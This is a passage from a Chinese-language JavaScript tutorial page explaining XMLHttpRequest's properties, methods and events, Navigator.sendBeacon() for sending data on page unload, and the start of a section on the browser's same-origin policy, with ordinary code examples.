<p>上面几种类型之中，<code>text</code>类型适合大多数情况，而且直接处理文本也比较方便。<code>document</code>类型适合返回 HTML / XML 文档的情况，这意味着，对于那些打开 CORS 的网站，可以直接用 Ajax 抓取网页，然后不用解析 HTML 字符串，直接对抓取回来的数据进行 DOM 操作。<code>blob</code>类型适合读取二进制数据，比如图片文件。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('GET', '/path/to/image.png', true);
+xhr.responseType = 'blob';
+
+xhr.onload = function(e) {
+  if (this.status === 200) {
+    var blob = new Blob([xhr.response], {type: 'image/png'});
+    // 或者
+    var blob = xhr.response;
+  }
+};
+
+xhr.send();
+</code></pre></div><p>如果将这个属性设为<code>ArrayBuffer</code>，就可以按照数组的方式处理二进制数据。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('GET', '/path/to/image.png', true);
+xhr.responseType = 'arraybuffer';
+
+xhr.onload = function(e) {
+  var uInt8Array = new Uint8Array(this.response);
+  for (var i = 0, len = uInt8Array.length; i &lt; len; ++i) {
+    // var byte = uInt8Array[i];
+  }
+};
+
+xhr.send();
+</code></pre></div><p>如果将这个属性设为<code>json</code>，浏览器就会自动对返回数据调用<code>JSON.parse()</code>方法。也就是说，从<code>xhr.response</code>属性（注意，不是<code>xhr.responseText</code>属性）得到的不是文本，而是一个 JSON 对象。</p> <h4 id="xmlhttprequest-responsetext"><a href="#xmlhttprequest-responsetext" class="header-anchor">#</a> XMLHttpRequest.responseText</h4> <p><code>XMLHttpRequest.responseText</code>属性返回从服务器接收到的字符串，该属性为只读。只有 HTTP 请求完成接收以后，该属性才会包含完整的数据。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('GET', '/server', true);
+
+xhr.responseType = 'text';
+xhr.onload = function () {
+  if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {
+    console.log(xhr.responseText);
+  }
+};
+
+xhr.send(null);
+</code></pre></div><h4 id="xmlhttprequest-responsexml"><a href="#xmlhttprequest-responsexml" class="header-anchor">#</a> XMLHttpRequest.responseXML</h4> <p><code>XMLHttpRequest.responseXML</code>属性返回从服务器接收到的 HTML 或 XML 文档对象，该属性为只读。如果本次请求没有成功，或者收到的数据不能被解析为 XML 或 HTML，该属性等于<code>null</code>。</p> <p>该属性生效的前提是 HTTP 回应的<code>Content-Type</code>头信息等于<code>text/xml</code>或<code>application/xml</code>。这要求在发送请求前，<code>XMLHttpRequest.responseType</code>属性要设为<code>document</code>。如果 HTTP 回应的<code>Content-Type</code>头信息不等于<code>text/xml</code>和<code>application/xml</code>，但是想从<code>responseXML</code>拿到数据（即把数据按照 DOM 格式解析），那么需要手动调用<code>XMLHttpRequest.overrideMimeType()</code>方法，强制进行 XML 解析。</p> <p>该属性得到的数据，是直接解析后的文档 DOM 树。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('GET', '/server', true);
+
+xhr.responseType = 'document';
+xhr.overrideMimeType('text/xml');
+
+xhr.onload = function () {
+  if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {
+    console.log(xhr.responseXML);
+  }
+};
+
+xhr.send(null);
+</code></pre></div><h4 id="xmlhttprequest-responseurl"><a href="#xmlhttprequest-responseurl" class="header-anchor">#</a> XMLHttpRequest.responseURL</h4> <p><code>XMLHttpRequest.responseURL</code>属性是字符串，表示发送数据的服务器的网址。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://example.com/test', true);
+xhr.onload = function () {
+  // 返回 http://example.com/test
+  console.log(xhr.responseURL);
+};
+xhr.send(null);
+</code></pre></div><p>注意，这个属性的值与<code>open()</code>方法指定的请求网址不一定相同。如果服务器端发生跳转，这个属性返回最后实际返回数据的网址。另外，如果原始 URL 包括锚点（fragment），该属性会把锚点剥离。</p> <h4 id="xmlhttprequest-status-xmlhttprequest-statustext"><a href="#xmlhttprequest-status-xmlhttprequest-statustext" class="header-anchor">#</a> XMLHttpRequest.status，XMLHttpRequest.statusText</h4> <p><code>XMLHttpRequest.status</code>属性返回一个整数，表示服务器回应的 HTTP 状态码。一般来说，如果通信成功的话，这个状态码是200；如果服务器没有返回状态码，那么这个属性默认是200。请求发出之前，该属性为<code>0</code>。该属性只读。</p> <ul><li>200, OK，访问正常</li> <li>301, Moved Permanently，永久移动</li> <li>302, Moved temporarily，暂时移动</li> <li>304, Not Modified，未修改</li> <li>307, Temporary Redirect，暂时重定向</li> <li>401, Unauthorized，未授权</li> <li>403, Forbidden，禁止访问</li> <li>404, Not Found，未发现指定网址</li> <li>500, Internal Server Error，服务器发生错误</li></ul> <p>基本上，只有2xx和304的状态码，表示服务器返回是正常状态。</p> <div class="language- extra-class"><pre class="language-text"><code>if (xhr.readyState === 4) {
+  if ( (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300)
+    || (xhr.status === 304) ) {
+    // 处理服务器的返回数据
+  } else {
+    // 出错
+  }
+}
+</code></pre></div><p><code>XMLHttpRequest.statusText</code>属性返回一个字符串，表示服务器发送的状态提示。不同于<code>status</code>属性，该属性包含整个状态信息，比如“OK”和“Not Found”。在请求发送之前（即调用<code>open()</code>方法之前），该属性的值是空字符串；如果服务器没有返回状态提示，该属性的值默认为“OK”。该属性为只读属性。</p> <h4 id="xmlhttprequest-timeout-xmlhttprequesteventtarget-ontimeout"><a href="#xmlhttprequest-timeout-xmlhttprequesteventtarget-ontimeout" class="header-anchor">#</a> XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout</h4> <p><code>XMLHttpRequest.timeout</code>属性返回一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于0，就表示没有时间限制。</p> <p><code>XMLHttpRequestEventTarget.ontimeout</code>属性用于设置一个监听函数，如果发生 timeout 事件，就会执行这个监听函数。</p> <p>下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+var url = '/server';
+
+xhr.ontimeout = function () {
+  console.error('The request for ' + url + ' timed out.');
+};
+
+xhr.onload = function() {
+  if (xhr.readyState === 4) {
+    if (xhr.status === 200) {
+      // 处理服务器返回的数据
+    } else {
+      console.error(xhr.statusText);
+    }
+  }
+};
+
+xhr.open('GET', url, true);
+// 指定 10 秒钟超时
+xhr.timeout = 10 * 1000;
+xhr.send(null);
+</code></pre></div><h4 id="事件监听属性"><a href="#事件监听属性" class="header-anchor">#</a> 事件监听属性</h4> <p>XMLHttpRequest 对象可以对以下事件指定监听函数。</p> <ul><li>XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数</li> <li>XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数</li> <li>XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了<code>abort()</code>方法）的监听函数</li> <li>XMLHttpRequest.onerror：error 事件（请求失败）的监听函数</li> <li>XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数</li> <li>XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数</li> <li>XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数</li></ul> <p>下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>xhr.onload = function() {
+ var responseText = xhr.responseText;
+ console.log(responseText);
+ // process the response.
+};
+
+xhr.onabort = function () {
+  console.log('The request was aborted');
+};
+
+xhr.onprogress = function (event) {
+  console.log(event.loaded);
+  console.log(event.total);
+};
+
+xhr.onerror = function() {
+  console.log('There was an error!');
+};
+</code></pre></div><p><code>progress</code>事件的监听函数有一个事件对象参数，该对象有三个属性：<code>loaded</code>属性返回已经传输的数据量，<code>total</code>属性返回总的数据量，<code>lengthComputable</code>属性返回一个布尔值，表示加载的进度是否可以计算。所有这些监听函数里面，只有<code>progress</code>事件的监听函数有参数，其他函数都没有参数。</p> <p>注意，如果发生网络错误（比如服务器无法连通），<code>onerror</code>事件无法获取报错信息。也就是说，可能没有错误对象，所以这样只能显示报错的提示。</p> <h4 id="xmlhttprequest-withcredentials"><a href="#xmlhttprequest-withcredentials" class="header-anchor">#</a> XMLHttpRequest.withCredentials</h4> <p><code>XMLHttpRequest.withCredentials</code>属性是一个布尔值，表示跨域请求时，用户信息（比如 Cookie 和认证的 HTTP 头信息）是否会包含在请求之中，默认为<code>false</code>，即向<code>example.com</code>发出跨域请求时，不会发送<code>example.com</code>设置在本机上的 Cookie（如果有的话）。</p> <p>如果需要跨域 AJAX 请求发送 Cookie，需要<code>withCredentials</code>属性设为<code>true</code>。注意，同源的请求不需要设置这个属性。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://example.com/', true);
+xhr.withCredentials = true;
+xhr.send(null);
+</code></pre></div><p>为了让这个属性生效，服务器必须显式返回<code>Access-Control-Allow-Credentials</code>这个头信息。</p> <div class="language- extra-class"><pre class="language-text"><code>Access-Control-Allow-Credentials: true
+</code></pre></div><p><code>withCredentials</code>属性打开的话，跨域请求不仅会发送 Cookie，还会设置远程主机指定的 Cookie。反之也成立，如果<code>withCredentials</code>属性没有打开，那么跨域的 AJAX 请求即使明确要求浏览器设置 Cookie，浏览器也会忽略。</p> <p>注意，脚本总是遵守同源政策，无法从<code>document.cookie</code>或者 HTTP 回应的头信息之中，读取跨域的 Cookie，<code>withCredentials</code>属性不影响这一点。</p> <h4 id="xmlhttprequest-upload"><a href="#xmlhttprequest-upload" class="header-anchor">#</a> XMLHttpRequest.upload</h4> <p>XMLHttpRequest 不仅可以发送请求，还可以发送文件，这就是 AJAX 文件上传。发送文件以后，通过<code>XMLHttpRequest.upload</code>属性可以得到一个对象，通过观察这个对象，可以得知上传的进展。主要方法就是监听这个对象的各种事件：loadstart、loadend、load、abort、error、progress、timeout。</p> <p>假定网页上有一个<code>&lt;progress&gt;</code>元素。</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;progress min=&quot;0&quot; max=&quot;100&quot; value=&quot;0&quot;&gt;0% complete&lt;/progress&gt;
+</code></pre></div><p>文件上传时，对<code>upload</code>属性指定<code>progress</code>事件的监听函数，即可获得上传的进度。</p> <div class="language- extra-class"><pre class="language-text"><code>function upload(blobOrFile) {
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', '/server', true);
+  xhr.onload = function (e) {};
+
+  var progressBar = document.querySelector('progress');
+  xhr.upload.onprogress = function (e) {
+    if (e.lengthComputable) {
+      progressBar.value = (e.loaded / e.total) * 100;
+      // 兼容不支持 &lt;progress&gt; 元素的老式浏览器
+      progressBar.textContent = progressBar.value;
+    }
+  };
+
+  xhr.send(blobOrFile);
+}
+
+upload(new Blob(['hello world'], {type: 'text/plain'}));
+</code></pre></div><h3 id="xmlhttprequest-的实例方法"><a href="#xmlhttprequest-的实例方法" class="header-anchor">#</a> XMLHttpRequest 的实例方法</h3> <h4 id="xmlhttprequest-open"><a href="#xmlhttprequest-open" class="header-anchor">#</a> XMLHttpRequest.open()</h4> <p><code>XMLHttpRequest.open()</code>方法用于指定 HTTP 请求的参数，或者说初始化 XMLHttpRequest 实例对象。它一共可以接受五个参数。</p> <div class="language- extra-class"><pre class="language-text"><code>void open(
+   string method,
+   string url,
+   optional boolean async,
+   optional string user,
+   optional string password
+);
+</code></pre></div><ul><li><code>method</code>：表示 HTTP 动词方法，比如<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>、<code>HEAD</code>等。</li> <li><code>url</code>: 表示请求发送目标 URL。</li> <li><code>async</code>: 布尔值，表示请求是否为异步，默认为<code>true</code>。如果设为<code>false</code>，则<code>send()</code>方法只有等到收到服务器返回了结果，才会进行下一步操作。该参数可选。由于同步 AJAX 请求会造成浏览器失去响应，许多浏览器已经禁止在主线程使用，只允许 Worker 里面使用。所以，这个参数轻易不应该设为<code>false</code>。</li> <li><code>user</code>：表示用于认证的用户名，默认为空字符串。该参数可选。</li> <li><code>password</code>：表示用于认证的密码，默认为空字符串。该参数可选。</li></ul> <p>注意，如果对使用过<code>open()</code>方法的 AJAX 请求，再次使用这个方法，等同于调用<code>abort()</code>，即终止请求。</p> <p>下面发送 POST 请求的例子。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('POST', encodeURI('someURL'));
+</code></pre></div><h4 id="xmlhttprequest-send"><a href="#xmlhttprequest-send" class="header-anchor">#</a> XMLHttpRequest.send()</h4> <p><code>XMLHttpRequest.send()</code>方法用于实际发出 HTTP 请求。它的参数是可选的，如果不带参数，就表示 HTTP 请求只有一个 URL，没有数据体，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。</p> <p>下面是 GET 请求的例子。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('GET',
+  'http://www.example.com/?id=' + encodeURIComponent(id),
+  true
+);
+xhr.send(null);
+</code></pre></div><p>上面代码中，<code>GET</code>请求的参数，作为查询字符串附加在 URL 后面。</p> <p>下面是发送 POST 请求的例子。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+var data = 'email='
+  + encodeURIComponent(email)
+  + '&amp;password='
+  + encodeURIComponent(password);
+
+xhr.open('POST', 'http://www.example.com', true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send(data);
+</code></pre></div><p>注意，所有 XMLHttpRequest 的监听事件，都必须在<code>send()</code>方法调用之前设定。</p> <p><code>send</code>方法的参数就是发送的数据。多种格式的数据，都可以作为它的参数。</p> <div class="language- extra-class"><pre class="language-text"><code>void send();
+void send(ArrayBufferView data);
+void send(Blob data);
+void send(Document data);
+void send(String data);
+void send(FormData data);
+</code></pre></div><p>如果<code>send()</code>发送 DOM 对象，在发送之前，数据会先被串行化。如果发送二进制数据，最好是发送<code>ArrayBufferView</code>或<code>Blob</code>对象，这使得通过 Ajax 上传文件成为可能。</p> <p>下面是发送表单数据的例子。<code>FormData</code>对象可以用于构造表单数据。</p> <div class="language- extra-class"><pre class="language-text"><code>var formData = new FormData();
+
+formData.append('username', '张三');
+formData.append('email', 'zhangsan@example.com');
+formData.append('birthDate', 1940);
+
+var xhr = new XMLHttpRequest();
+xhr.open('POST', '/register');
+xhr.send(formData);
+</code></pre></div><p>上面代码中，<code>FormData</code>对象构造了表单数据，然后使用<code>send()</code>方法发送。它的效果与发送下面的表单数据是一样的。</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;form id='registration' name='registration' action='/register'&gt;
+  &lt;input type='text' name='username' value='张三'&gt;
+  &lt;input type='email' name='email' value='zhangsan@example.com'&gt;
+  &lt;input type='number' name='birthDate' value='1940'&gt;
+  &lt;input type='submit' onclick='return sendForm(this.form);'&gt;
+&lt;/form&gt;
+</code></pre></div><p>下面的例子是使用<code>FormData</code>对象加工表单数据，然后再发送。</p> <div class="language- extra-class"><pre class="language-text"><code>function sendForm(form) {
+  var formData = new FormData(form);
+  formData.append('csrf', 'e69a18d7db1286040586e6da1950128c');
+
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', form.action, true);
+  xhr.onload = function() {
+    // ...
+  };
+  xhr.send(formData);
+
+  return false;
+}
+
+var form = document.querySelector('#registration');
+sendForm(form);
+</code></pre></div><h4 id="xmlhttprequest-setrequestheader"><a href="#xmlhttprequest-setrequestheader" class="header-anchor">#</a> XMLHttpRequest.setRequestHeader()</h4> <p><code>XMLHttpRequest.setRequestHeader()</code>方法用于设置浏览器发送的 HTTP 请求的头信息。该方法必须在<code>open()</code>之后、<code>send()</code>之前调用。如果该方法多次调用，设定同一个字段，则每一次调用的值会被合并成一个单一的值发送。</p> <p>该方法接受两个参数。第一个参数是字符串，表示头信息的字段名，第二个参数是字段值。</p> <div class="language- extra-class"><pre class="language-text"><code>xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.setRequestHeader('Content-Length', JSON.stringify(data).length);
+xhr.send(JSON.stringify(data));
+</code></pre></div><p>上面代码首先设置头信息<code>Content-Type</code>，表示发送 JSON 格式的数据；然后设置<code>Content-Length</code>，表示数据长度；最后发送 JSON 数据。</p> <h4 id="xmlhttprequest-overridemimetype"><a href="#xmlhttprequest-overridemimetype" class="header-anchor">#</a> XMLHttpRequest.overrideMimeType()</h4> <p><code>XMLHttpRequest.overrideMimeType()</code>方法用来指定 MIME 类型，覆盖服务器返回的真正的 MIME 类型，从而让浏览器进行不一样的处理。举例来说，服务器返回的数据类型是<code>text/xml</code>，由于种种原因浏览器解析不成功报错，这时就拿不到数据了。为了拿到原始数据，我们可以把 MIME 类型改成<code>text/plain</code>，这样浏览器就不会去自动解析，从而我们就可以拿到原始文本了。</p> <div class="language- extra-class"><pre class="language-text"><code>xhr.overrideMimeType('text/plain')
+</code></pre></div><p>注意，该方法必须在<code>send()</code>方法之前调用。</p> <p>修改服务器返回的数据类型，不是正常情况下应该采取的方法。如果希望服务器返回指定的数据类型，可以用<code>responseType</code>属性告诉服务器，就像下面的例子。只有在服务器无法返回某种数据类型时，才使用<code>overrideMimeType()</code>方法。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.onload = function(e) {
+  var arraybuffer = xhr.response;
+  // ...
+}
+xhr.open('GET', url);
+xhr.responseType = 'arraybuffer';
+xhr.send();
+</code></pre></div><h4 id="xmlhttprequest-getresponseheader"><a href="#xmlhttprequest-getresponseheader" class="header-anchor">#</a> XMLHttpRequest.getResponseHeader()</h4> <p><code>XMLHttpRequest.getResponseHeader()</code>方法返回 HTTP 头信息指定字段的值，如果还没有收到服务器回应或者指定字段不存在，返回<code>null</code>。该方法的参数不区分大小写。</p> <div class="language- extra-class"><pre class="language-text"><code>function getHeaderTime() {
+  console.log(this.getResponseHeader(&quot;Last-Modified&quot;));
+}
+
+var xhr = new XMLHttpRequest();
+xhr.open('HEAD', 'yourpage.html');
+xhr.onload = getHeaderTime;
+xhr.send();
+</code></pre></div><p>如果有多个字段同名，它们的值会被连接为一个字符串，每个字段之间使用“逗号+空格”分隔。</p> <h4 id="xmlhttprequest-getallresponseheaders"><a href="#xmlhttprequest-getallresponseheaders" class="header-anchor">#</a> XMLHttpRequest.getAllResponseHeaders()</h4> <p><code>XMLHttpRequest.getAllResponseHeaders()</code>方法返回一个字符串，表示服务器发来的所有 HTTP 头信息。格式为字符串，每个头信息之间使用<code>CRLF</code>分隔（回车+换行），如果没有收到服务器回应，该属性为<code>null</code>。如果发生网络错误，该属性为空字符串。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('GET', 'foo.txt', true);
+xhr.send();
+
+xhr.onreadystatechange = function () {
+  if (this.readyState === 4) {
+    var headers = xhr.getAllResponseHeaders();
+  }
+}
+</code></pre></div><p>上面代码用于获取服务器返回的所有头信息。它可能是下面这样的字符串。</p> <div class="language- extra-class"><pre class="language-text"><code>date: Fri, 08 Dec 2017 21:04:30 GMT\r\n
+content-encoding: gzip\r\n
+x-content-type-options: nosniff\r\n
+server: meinheld/0.6.1\r\n
+x-frame-options: DENY\r\n
+content-type: text/html; charset=utf-8\r\n
+connection: keep-alive\r\n
+strict-transport-security: max-age=63072000\r\n
+vary: Cookie, Accept-Encoding\r\n
+content-length: 6502\r\n
+x-xss-protection: 1; mode=block\r\n
+</code></pre></div><p>然后，对这个字符串进行处理。</p> <div class="language- extra-class"><pre class="language-text"><code>var arr = headers.trim().split(/[\r\n]+/);
+var headerMap = {};
+
+arr.forEach(function (line) {
+  var parts = line.split(': ');
+  var header = parts.shift();
+  var value = parts.join(': ');
+  headerMap[header] = value;
+});
+
+headerMap['content-length'] // &quot;6502&quot;
+</code></pre></div><h4 id="xmlhttprequest-abort"><a href="#xmlhttprequest-abort" class="header-anchor">#</a> XMLHttpRequest.abort()</h4> <p><code>XMLHttpRequest.abort()</code>方法用来终止已经发出的 HTTP 请求。调用这个方法以后，<code>readyState</code>属性变为<code>4</code>，<code>status</code>属性变为<code>0</code>。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://www.example.com/page.php', true);
+setTimeout(function () {
+  if (xhr) {
+    xhr.abort();
+    xhr = null;
+  }
+}, 5000);
+</code></pre></div><p>上面代码在发出5秒之后，终止一个 AJAX 请求。</p> <h3 id="xmlhttprequest-实例的事件"><a href="#xmlhttprequest-实例的事件" class="header-anchor">#</a> XMLHttpRequest 实例的事件</h3> <h4 id="readystatechange-事件"><a href="#readystatechange-事件" class="header-anchor">#</a> readyStateChange 事件</h4> <p><code>readyState</code>属性的值发生改变，就会触发 readyStateChange 事件。</p> <p>我们可以通过<code>onReadyStateChange</code>属性，指定这个事件的监听函数，对不同状态进行不同处理。尤其是当状态变为<code>4</code>的时候，表示通信成功，这时回调函数就可以处理服务器传送回来的数据。</p> <h4 id="progress-事件"><a href="#progress-事件" class="header-anchor">#</a> progress 事件</h4> <p>上传文件时，XMLHttpRequest 实例对象本身和实例的<code>upload</code>属性，都有一个<code>progress</code>事件，会不断返回上传的进度。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+
+function updateProgress (oEvent) {
+  if (oEvent.lengthComputable) {
+    var percentComplete = oEvent.loaded / oEvent.total;
+  } else {
+    console.log('无法计算进展');
+  }
+}
+
+xhr.addEventListener('progress', updateProgress);
+
+xhr.open();
+</code></pre></div><h4 id="load-事件、error-事件、abort-事件"><a href="#load-事件、error-事件、abort-事件" class="header-anchor">#</a> load 事件、error 事件、abort 事件</h4> <p>load 事件表示服务器传来的数据接收完毕，error 事件表示请求出错，abort 事件表示请求被中断（比如用户取消请求）。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+
+xhr.addEventListener('load', transferComplete);
+xhr.addEventListener('error', transferFailed);
+xhr.addEventListener('abort', transferCanceled);
+
+xhr.open();
+
+function transferComplete() {
+  console.log('数据接收完毕');
+}
+
+function transferFailed() {
+  console.log('数据接收出错');
+}
+
+function transferCanceled() {
+  console.log('用户取消接收');
+}
+</code></pre></div><h4 id="loadend-事件"><a href="#loadend-事件" class="header-anchor">#</a> loadend 事件</h4> <p><code>abort</code>、<code>load</code>和<code>error</code>这三个事件，会伴随一个<code>loadend</code>事件，表示请求结束，但不知道其是否成功。</p> <div class="language- extra-class"><pre class="language-text"><code>xhr.addEventListener('loadend', loadEnd);
+
+function loadEnd(e) {
+  console.log('请求结束，状态未知');
+}
+</code></pre></div><h4 id="timeout-事件"><a href="#timeout-事件" class="header-anchor">#</a> timeout 事件</h4> <p>服务器超过指定时间还没有返回结果，就会触发 timeout 事件，具体的例子参见<code>timeout</code>属性一节。</p> <h3 id="navigator-sendbeacon-2"><a href="#navigator-sendbeacon-2" class="header-anchor">#</a> Navigator.sendBeacon()</h3> <p>用户卸载网页的时候，有时需要向服务器发一些数据。很自然的做法是在<code>unload</code>事件或<code>beforeunload</code>事件的监听函数里面，使用<code>XMLHttpRequest</code>对象发送数据。但是，这样做不是很可靠，因为<code>XMLHttpRequest</code>对象是异步发送，很可能在它即将发送的时候，页面已经卸载了，从而导致发送取消或者发送失败。</p> <p>解决方法就是<code>unload</code>事件里面，加一些很耗时的同步操作。这样就能留出足够的时间，保证异步 AJAX 能够发送成功。</p> <div class="language- extra-class"><pre class="language-text"><code>function log() {
+  let xhr = new XMLHttpRequest();
+  xhr.open('post', '/log', true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.send('foo=bar');
+}
+
+window.addEventListener('unload', function(event) {
+  log();
+
+  // a time-consuming operation
+  for (let i = 1; i &lt; 10000; i++) {
+    for (let m = 1; m &lt; 10000; m++) { continue; }
+  }
+});
+</code></pre></div><p>上面代码中，强制执行了一次双重循环，拖长了<code>unload</code>事件的执行时间，导致异步 AJAX 能够发送成功。</p> <p>类似的还可以使用<code>setTimeout</code>。下面是追踪用户点击的例子。</p> <div class="language- extra-class"><pre class="language-text"><code>// HTML 代码如下
+// &lt;a id=&quot;target&quot; href=&quot;https://baidu.com&quot;&gt;click&lt;/a&gt;
+const clickTime = 350;
+const theLink = document.getElementById('target');
+
+function log() {
+  let xhr = new XMLHttpRequest();
+  xhr.open('post', '/log', true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.send('foo=bar');
+}
+
+theLink.addEventListener('click', function (event) {
+  event.preventDefault();
+  log();
+
+  setTimeout(function () {
+    window.location.href = theLink.getAttribute('href');
+  }, clickTime);
+});
+</code></pre></div><p>上面代码使用<code>setTimeout</code>，拖延了350毫秒，才让页面跳转，因此使得异步 AJAX 有时间发出。</p> <p>这些做法的共同问题是，卸载的时间被硬生生拖长了，后面页面的加载被推迟了，用户体验不好。</p> <p>为了解决这个问题，浏览器引入了<code>Navigator.sendBeacon()</code>方法。这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此可以保证会把数据发出去，不拖延卸载流程。</p> <div class="language- extra-class"><pre class="language-text"><code>window.addEventListener('unload', logData, false);
+
+function logData() {
+  navigator.sendBeacon('/log', analyticsData);
+}
+</code></pre></div><p><code>Navigator.sendBeacon</code>方法接受两个参数，第一个参数是目标服务器的 URL，第二个参数是所要发送的数据（可选），可以是任意类型（字符串、表单对象、二进制对象等等）。</p> <div class="language- extra-class"><pre class="language-text"><code>navigator.sendBeacon(url, data)
+</code></pre></div><p>这个方法的返回值是一个布尔值，成功发送数据为<code>true</code>，否则为<code>false</code>。</p> <p>该方法发送数据的 HTTP 方法是 POST，可以跨域，类似于表单提交数据。它不能指定回调函数。</p> <p>下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>// HTML 代码如下
+// &lt;body onload=&quot;analytics('start')&quot; onunload=&quot;analytics('end')&quot;&gt;
+
+function analytics(state) {
+  if (!navigator.sendBeacon) return;
+
+  var URL = 'http://example.com/analytics';
+  var data = 'state=' + state + '&amp;location=' + window.location;
+  navigator.sendBeacon(URL, data);
+}
+</code></pre></div><h2 id="同源限制"><a href="#同源限制" class="header-anchor">#</a> 同源限制</h2> <p>浏览器安全的基石是“同源政策”（<a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank" rel="noopener noreferrer">same-origin policy<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>）。很多开发者都知道这一点，但了解得不全面。</p> <h3 id="概述-2"><a href="#概述-2" class="header-anchor">#</a> 概述</h3> <h4 id="含义"><a href="#含义" class="header-anchor">#</a> 含义</h4> <p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p> <p>最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是“三个相同”。</p> <blockquote><ul><li>协议相同</li> <li>域名相同</li> <li>端口相同（这点可以忽略，详见下文）</li></ul></blockquote> <p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略），它的同源情况如下。</p> <ul><li><code>http://www.example.com/dir2/other.html</code>：同源</li> <li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li> <li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li> <li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li> <li><code>https://www.example.com/dir/page.html</code>：不同源（协议不同）</li></ul> <p>注意，标准规定端口不同的网址不是同源（比如8000端口和8001端口不是同源），但是浏览器没有遵守这条规定。实际上，同一个网域的不同端口，是可以互相读取 Cookie 的。</p> <h4 id="目的"><a href="#目的" class="header-anchor">#</a> 目的</h4> <p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p> <p>设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私就泄漏了。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p> <p>由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p> <h4 id="限制范围"><a href="#限制范围" class="header-anchor">#</a> 限制范围</h4> <p>随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。</p> <blockquote><p>（1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。</p> <p>（2） 无法接触非同源网页的 DOM。</p> <p>（3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。</p></blockquote> <p>另外，通过 JavaScript 脚本可以拿到其他窗口的<code>window</code>对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的<code>window</code>对象的九个属性和四个方法。</p> <ul><li>window.closed</li> <li>window.frames</li> <li>window.length</li> <li>window.location</li> <li>window.opener</li> <li>window.parent</li> <li>window.self</li> <li>window.top</li> <li>window.window</li> <li>window.blur()</li> <li>window.close()</li> <li>window.focus()</li> 